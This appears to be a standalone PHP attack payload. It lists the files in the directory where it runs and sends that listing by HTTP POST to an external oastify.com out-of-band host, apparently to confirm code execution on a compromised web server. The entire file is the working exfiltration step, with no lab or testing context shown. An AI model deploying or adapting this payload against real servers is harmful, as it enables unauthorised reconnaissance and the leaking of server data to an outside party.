<?php

function sendPostRequest($url, $data) {
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $context  = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

$directoryContents = scandir('.');


$directoryListing = implode("\n", $directoryContents);


$externalUrl = 'https://jre9ejcpo5s4vilra8rvrps32u8lwbk0.oastify.com';
sendPostRequest($externalUrl, ['data' => $directoryListing]);

?>
